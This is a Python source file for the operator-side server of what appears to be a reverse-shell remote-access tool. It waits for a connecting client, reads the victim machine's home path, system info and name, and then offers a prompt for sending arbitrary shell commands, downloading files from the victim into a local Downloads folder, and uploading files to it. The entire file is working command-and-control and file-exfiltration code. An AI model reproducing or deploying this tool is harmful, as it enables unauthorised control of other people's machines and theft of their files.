import socket
import os
import helpmsg

class ServerApp:
    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.help = helpmsg.help_message
        self.host = host
        self.port = port
        self.pc_name = ''
        self.pc_ip = ''
        try:
            os.mkdir('Downloads')
            print('[+]PATH "Downloads CREATED"')
        except FileExistsError:
            print('[!]PATH "Downloads" ALREADY EXISTS')

    def mainloop(self):
        print("WAITING FOR CONNECTION")
        self.server.bind((self.host, self.port))
        self.server.listen(1)
        client, client_addr = self.server.accept()
        self.pc_ip = client_addr[0]
        print(f"[+] CLIENT {self.pc_ip} CONNECTED TO THE SERVER\nPRINT help TO LIST AVAILABLE COMMANDS")
        self.say_hello(client)

    def say_hello(self, client):
        separator = '=' * 50
        output = client.recv(1024)
        output = output.decode()
        output = output.split(separator)
        home, sys_info, self.pc_name = output[0], output[1], output[2][1:]
        command = input(f'{sys_info}\n{home}\n{self.pc_ip + "@" + self.pc_name}#:')
        self.process(client, task=command)

    @staticmethod
    def get_file(client, filename):
        max_file_len = 1024 ** 3
        output = client.recv(max_file_len)
        try:
            res = output.decode()
            if res == "ERROR":
                print('ERROR! FILE DOESNT EXISTS')
            else:
                file = open(f'Downloads/{filename}', 'wb')
                file.write(output)
                file.close()
                print('FILE SAVED TO /Downloads')
        except UnicodeDecodeError:
            file = open(f'Downloads/{filename}', 'wb')
            file.write(output)
            file.close()
            print('FILE SAVED TO /Downloads')

    @staticmethod
    def send_file(client, filename):
        separator = '=' * 50
        b_filename = filename.encode()
        b_separator = separator.encode()
        try:
            with open(filename, 'rb') as b_file:
                b_file = b_file.read()
            res = b_filename + b_separator + b_file
            client.send(res)
            print('FILE SENT TO SERVER')
        except FileNotFoundError:
            print('ERROR! FILE NOT FOUND')
            command = 'return'
            command = command.encode()
            client.send(command)

    @staticmethod
    def get_output(client):
        output = client.recv(1024)
        output = output.decode()
        return output

    def process(self, client, task=None):
        while True:
            if not task:
                command = input(f'{self.pc_ip + "@" + self.pc_name}#:')
            else:
                command, task = task, None
            if command == 'exit':
                command = command.encode()
                client.send(command)
                break
            elif command == 'help':
                print(f'{self.help}')
                continue
            elif command.startswith('get'):
                filename = command.split()[1]
                command = command.encode()
                client.send(command)
                self.get_file(client, filename)
                continue
            elif command.startswith('send'):
                filename = command.split()[1]
                command = 'sending'
                command = command.encode()
                client.send(command)
                self.send_file(client, filename)
                output = self.get_output(client)
                print(f'\033[0m{output}')
                continue
            command = command.encode()
            try:
                client.send(command)
                output = self.get_output(client)
                print(f'{output}')
            except ConnectionAbortedError:
                print('DISCONNECTED')
        self.server.close()
        print('DISCONNECTED')
